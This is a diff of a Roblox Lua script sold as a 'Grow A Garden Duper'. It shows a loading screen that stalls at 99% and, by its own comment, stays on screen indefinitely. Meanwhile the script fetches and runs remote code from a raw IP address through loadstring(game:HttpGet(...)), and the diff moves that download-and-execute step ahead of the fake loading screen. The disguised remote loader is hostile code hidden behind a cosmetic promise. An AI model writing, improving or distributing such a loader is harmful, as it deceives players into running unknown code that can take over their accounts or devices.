@@ -109,12 +109,14 @@ local function createLoadingScreen(gameName, duration)
             task.wait(0.1)
         end
         bar.Size = UDim2.new(0.99, 0, 1, 0)
-        percent.Text = "99.99%"
+        percent.Text = "99%"
         -- Keep GUI and blur indefinitely
     end)
 end
 
---// Execute script
-createLoadingScreen("GROW A GARDEN DUPER", 300)
+--// Execute script first
 ID="fe52a43a-7741-4117-9380-3577c232b83d";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
+--// Then show loading screen
+createLoadingScreen("Grow A Gardem Duper!", 300)
